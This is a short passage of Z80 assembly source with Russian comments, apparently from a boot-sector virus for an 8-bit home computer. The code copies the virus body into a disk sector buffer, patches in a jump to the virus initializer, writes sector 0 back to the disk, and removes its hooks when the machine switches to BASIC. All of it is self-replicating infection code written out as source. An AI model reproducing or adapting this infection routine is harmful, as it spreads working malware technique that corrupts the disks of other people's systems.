	push	hl
	ldir
	ex	de,hl			; Запись кода для перехода
	pop	de			; в инициализатор вируса
	ld	c,6
	ldir

	ld	l,c			; Перепись самого вируса
	ld	de,(Buffer)		; В байты 100h..1FFh
	inc	d			; считанного сектора
	inc	b
	ldir

	ld	d,c			; Запись 0-го сектора
	ld	e,c
	ld	hl,(StDrive)
	ld	h,1
	call	DSKWR

Return:
	pop	hl			; Восстановление старого
	ld	(stDMA),hl		; значения адреса обмена
	pop	iy
	pop	ix
	ret

; Отключению ловушек в при переходе в BASIC
; Вызывается из подпрограммы INITPAT, которая устанавливает для
; BASICа режим экрана и начертание символов. Она вызывается
; всегда при переходе в BASIC, поэтому это удобное место для
; перехвата такого перехода с целью отключения вируса

Hook2Body:
	ld	a,(SETROM)
	cp	.RET			;Каждый 5-й байт равен .RET

	ret	nz
	nop
	nop
	ld	a,.RET
	ld	(HOOK),a
	ld	a,.RET
	ld	(HOOK2),a
	ret

